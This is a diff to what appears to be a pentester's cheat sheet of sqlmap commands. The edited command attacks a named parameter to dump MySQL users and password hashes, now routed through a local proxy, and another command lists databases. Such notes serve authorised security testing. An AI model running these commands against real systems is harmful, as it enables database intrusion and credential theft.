@@ -1,5 +1,5 @@
 #Sample Command
-sqlmap -r sqlfile -p paramToAttack --dbms mysql --users --passwords --batch --technique=QT --not-string=SQL-ERR --flush-session
+sqlmap -r sqlfile -p paramToAttack --dbms mysql --users --passwords --batch --technique=QT --not-string=SQL-ERR --flush-session --proxy=http://127.0.0.1:8080
 
 #List databases
 sqlmap -r sqlfile --batch  --dbs
